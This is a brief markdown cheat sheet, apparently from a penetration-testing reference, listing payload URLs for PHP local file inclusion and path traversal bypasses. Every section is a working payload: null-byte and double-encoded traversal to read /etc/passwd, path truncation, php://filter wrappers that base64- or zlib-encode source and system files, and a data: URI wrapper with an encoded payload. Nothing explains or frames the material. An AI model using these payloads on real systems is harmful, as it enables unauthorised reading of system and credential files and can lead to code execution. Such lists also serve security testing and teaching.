# Bypass Techniques

### General

```bash
#Null byte (%00)
http://example.com/index.php?page=../../../etc/passwd%00

#URL encoding
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00

#Path Truncation
##In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

### PHP Wrappers

```bash
#Base64
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php

#Zlib (compression)
http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
#To read it, execute this in your php console
readfile('php://filter/zlib.inflate/resource=test.deflated');

#Data - #Bypass Chrome Auditor
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```



